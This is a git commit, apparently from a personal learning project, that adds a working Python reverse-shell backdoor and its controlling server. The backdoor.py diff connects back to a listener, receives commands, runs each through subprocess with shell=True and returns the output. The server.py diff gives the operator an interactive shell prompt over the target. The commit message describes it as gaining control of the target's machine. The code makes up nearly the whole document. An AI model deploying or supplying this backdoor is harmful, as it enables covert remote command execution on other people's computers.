f3e6402e67e5d6ca0e83bfca83a1e57bc6261acc
JoaoAJMatos <joaoafonsoj2004@gmail.com>
2021-08-31 20:05:37 +0100

    Gaining controll of the target's machine & executing commands
    The server is now able to send reverse shell commands to the target's machine. The target handles those commands and sends the result back to the server.

--- backdoor.py
+++ backdoor.py
@@ -1,4 +1,44 @@
 import socket
+import json
+import subprocess
+
+def send(data):
+    jsonData = json.dumps(data)
+    s.send(jsonData.encode())
+
+# In order not to overflow the default socket.recv() function
+# the function recv() reads the data in chunks of 1024 bytes
+# at a time and appends it to the data variable.
+def recv():
+    data = ''
+
+    while True:
+        try:
+            data = data + s.recv(1024).decode().rstrip()
+            return json.loads(data)
+        
+        except ValueError:
+            continue
+
+def shell():
+    while True:
+
+        command = recv()
+
+        if command == 'exit': # Exit the loop if the exit message is received 
+            break
+
+        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+        result = execute.stdout.read() + execute.stderr.read()
+        result = result.decode()
+        send(result)
+
+# Connection data
+HOST = '127.0.0.1'
+PORT = 5555
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('127.0.0.1', 5555))
+s.connect((HOST, PORT))
+
+shell()
--- server.py
+++ server.py
@@ -1,6 +1,39 @@
 import socket
 import termcolor
+import json
 
+def send(data):
+    jsonData = json.dumps(data)
+    target.send(jsonData.encode())
+
+# In order not to overflow the default socket.recv() function
+# the function recv() reads the data in chunks of 1024 bytes
+# at a time and appends it to the data variable.
+def recv():
+    data = ''
+
+    while True:
+        try:
+            data = data + target.recv(1024).decode().rstrip()
+            return json.loads(data)
+        
+        except ValueError:
+            continue
+
+# Sends and receives data to and from the backdoor
+def targetComs():
+    while True:
+
+        prompt = input("Shell [%s]:" % str(ip))
+        send(prompt)
+
+        if prompt == 'exit': # Exit the loop if the exit message is sent
+            break
+
+        response = recv()
+        print(response)
+
+# Connection data
 HOST = '127.0.0.1'
 PORT = 5555
 
@@ -13,3 +46,5 @@ sock.listen(5)
 
 target, ip = sock.accept()
 print(termcolor.colored(f'[+] Connection astablished with [{str(ip[0])}] port [{str(ip[1])}]!', 'green'))
+
+targetComs()
